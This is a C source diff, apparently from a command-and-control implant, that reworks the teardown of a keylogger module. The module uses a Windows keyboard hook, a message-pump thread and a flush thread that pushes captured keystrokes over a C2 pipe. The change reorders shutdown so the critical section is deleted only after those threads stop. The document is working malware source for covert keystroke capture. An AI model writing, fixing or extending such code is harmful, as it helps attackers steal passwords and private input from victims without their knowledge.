@@ -836,7 +836,8 @@ static void keyscan_ensure_stopped(void)
         keyscan_thread = NULL;
     }
 
-    w.pDeleteCriticalSection(&keyscan_cs);
+    /* NOTE: caller is responsible for DeleteCriticalSection
+     * after all users (flush thread, etc.) have stopped. */
 }
 
 static tlv_pkt_t *keyscan_start(c2_t *c2)
@@ -854,6 +855,7 @@ static tlv_pkt_t *keyscan_start(c2_t *c2)
 static tlv_pkt_t *keyscan_stop(c2_t *c2)
 {
     keyscan_ensure_stopped();
+    w.pDeleteCriticalSection(&keyscan_cs);
     return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
@@ -912,25 +914,43 @@ static int keyscan_pipe_heartbeat(pipe_t *pipe, c2_t *c2)
 
 static int keyscan_pipe_destroy(pipe_t *pipe, c2_t *c2)
 {
-    pipe_t *saved = keyscan_active_pipe;
+    /* 1. Null the active pipe so the flush thread stops enqueuing
+     *    new packets to the C2 channel. */
+    keyscan_active_pipe = NULL;
 
-    /* Stop flush thread first (keyscan_running=0 makes it exit) */
-    keyscan_ensure_stopped();
+    /* 2. Signal the keylogger hook and flush thread to stop.
+     *    The flush thread checks keyscan_running and will exit. */
+    keyscan_running = 0;
 
-    /* Flush any remaining buffered keystrokes */
-    if (saved != NULL && saved->c2 != NULL)
-    {
-        keyscan_flush_push_buf();
-    }
-
+    /* 3. Wait for the flush thread to finish its final flush and exit.
+     *    This must happen BEFORE we delete the critical section. */
     if (keyscan_flush_thread != NULL)
     {
-        w.pWaitForSingleObject(keyscan_flush_thread, 2000);
+        w.pWaitForSingleObject(keyscan_flush_thread, 3000);
         w.pCloseHandle(keyscan_flush_thread);
         keyscan_flush_thread = NULL;
     }
 
-    keyscan_active_pipe = NULL;
+    /* 4. Tear down the hook and its message-pump thread.
+     *    (Cannot use keyscan_ensure_stopped here because
+     *     keyscan_running is already 0.) */
+    if (keyscan_hook)
+    {
+        w.pUnhookWindowsHookEx(keyscan_hook);
+        keyscan_hook = NULL;
+    }
+
+    if (keyscan_thread)
+    {
+        w.pPostThreadMessageA(w.pGetThreadId(keyscan_thread), WM_QUIT, 0, 0);
+        w.pWaitForSingleObject(keyscan_thread, 5000);
+        w.pCloseHandle(keyscan_thread);
+        keyscan_thread = NULL;
+    }
+
+    /* 5. All threads stopped — safe to destroy the critical section. */
+    w.pDeleteCriticalSection(&keyscan_cs);
+
     return 0;
 }
 
